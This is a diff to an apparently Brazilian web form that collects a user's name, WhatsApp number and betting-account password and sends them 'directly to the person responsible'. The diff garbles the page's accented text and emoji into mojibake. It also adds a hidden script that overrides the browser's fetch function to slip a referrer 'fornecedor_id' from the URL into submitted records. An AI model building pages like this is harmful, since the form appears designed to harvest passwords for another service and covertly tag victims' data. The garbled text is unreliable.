@@ -105,7 +105,7 @@
 <div class="wrapper">
   <div class="header">
     <h1>Cadastro de Conta</h1>
-    <p>Preencha os dados da sua conta de apostas.<br>As informações serão enviadas de forma segura.</p>
+    <p>Preencha os dados da sua conta de apostas.<br>As informaÃ§Ãµes serÃ£o enviadas de forma segura.</p>
   </div>
 
   <div class="card">
@@ -115,13 +115,13 @@
 
     <div class="field">
       <label>Nome completo <span class="req">*</span></label>
-      <input id="f-nome" type="text" placeholder="Ex: João da Silva" autocomplete="name"/>
+      <input id="f-nome" type="text" placeholder="Ex: JoÃ£o da Silva" autocomplete="name"/>
     </div>
 
     <div class="field">
       <label>WhatsApp <span class="req">*</span></label>
       <input id="f-wpp" type="tel" placeholder="(11) 99999-9999" inputmode="numeric" maxlength="16"/>
-      <div class="hint">DDD + número, sem espaços ou traços</div>
+      <div class="hint">DDD + nÃºmero, sem espaÃ§os ou traÃ§os</div>
     </div>
 
     <div class="field">
@@ -153,8 +153,8 @@
     <div class="field">
       <label>Senha <span class="req">*</span></label>
       <div class="pass-wrap">
-        <input id="f-senha" type="password" placeholder="••••••••" autocomplete="current-password"/>
-        <button type="button" class="pass-toggle" onclick="togglePass()" title="Mostrar/ocultar">👁</button>
+        <input id="f-senha" type="password" placeholder="â¢â¢â¢â¢â¢â¢â¢â¢" autocomplete="current-password"/>
+        <button type="button" class="pass-toggle" onclick="togglePass()" title="Mostrar/ocultar">ð</button>
       </div>
     </div>
 
@@ -164,14 +164,14 @@
   </div>
 
   <p class="footer-note">
-    🔒 Seus dados são enviados <strong>com segurança</strong><br>
-    diretamente para o responsável.
+    ð Seus dados sÃ£o enviados <strong>com seguranÃ§a</strong><br>
+    diretamente para o responsÃ¡vel.
   </p>
 </div>
 
 <div class="overlay" id="modal-ok">
   <div class="modal">
-    <div class="icon">✅</div>
+    <div class="icon">â</div>
     <h2>Cadastro enviado!</h2>
     <p>Seus dados foram registrados com sucesso.<br>Em breve entraremos em contato pelo WhatsApp.</p>
     <button class="btn-close" onclick="document.getElementById('modal-ok').classList.remove('open')">Fechar</button>
@@ -280,7 +280,7 @@
       if (err.name === 'AbortError') {
         mostrarErro('Tempo esgotado. Tente novamente em instantes.');
       } else {
-        mostrarErro('Erro ao enviar. Verifique sua conexão e tente novamente.');
+        mostrarErro('Erro ao enviar. Verifique sua conexÃ£o e tente novamente.');
       }
       console.error(err);
     } finally {
@@ -290,6 +290,25 @@
   }
 </script>
 
+
+<script>
+(function() {
+  var ref = new URLSearchParams(window.location.search).get('ref') || null;
+  if (!ref) return;
+  var _fetch = window.fetch;
+  window.fetch = function(url, opts) {
+    if (typeof url === 'string' && url.includes('/rest/v1/waitlist') && opts && opts.method === 'POST') {
+      try {
+        var body = JSON.parse(opts.body || '{}');
+        if (Array.isArray(body)) body[0].fornecedor_id = ref;
+        else body.fornecedor_id = ref;
+        opts.body = JSON.stringify(body);
+      } catch(e) {}
+    }
+    return _fetch.apply(this, arguments);
+  };
+})();
+</script>
 </body>
 </html>
 
